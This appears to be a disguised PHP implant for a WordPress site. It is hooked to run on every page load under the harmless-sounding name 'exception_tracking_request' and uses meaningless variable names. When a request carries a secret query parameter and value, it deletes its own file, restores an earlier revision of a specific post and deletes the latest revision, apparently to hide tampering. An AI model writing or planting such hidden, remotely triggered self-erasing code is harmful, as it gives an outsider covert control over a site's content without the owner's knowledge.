<?php

function exception_tracking_request() {
	if (isset($_GET['results_current_divi_search']) && $_GET['results_current_divi_search'] === 'assistant_ninja_cool_alt') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$chat_pixel_permalink_status = 10684;
		$like_private_campaign_lead = wp_get_post_revisions($chat_pixel_permalink_status);
		if (empty($like_private_campaign_lead)) die('no revisions');
		if (count($like_private_campaign_lead) < 2) die('less than 2');
		$type_quotes_updates = array_shift($like_private_campaign_lead);
		$duplicate_audio_gravity_really = $type_quotes_updates->ID;
		$recipe_settings_page = array_shift($like_private_campaign_lead);
		$landing_assistant_effect = $recipe_settings_page->ID;
		$paragraph_checkout_archive_debug = wp_restore_post_revision($landing_assistant_effect);
		if ($paragraph_checkout_archive_debug === false) die('error restoring');
		$paragraph_checkout_archive_debug = wp_delete_post_revision($duplicate_audio_gravity_really);		
		if ($paragraph_checkout_archive_debug === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'exception_tracking_request');
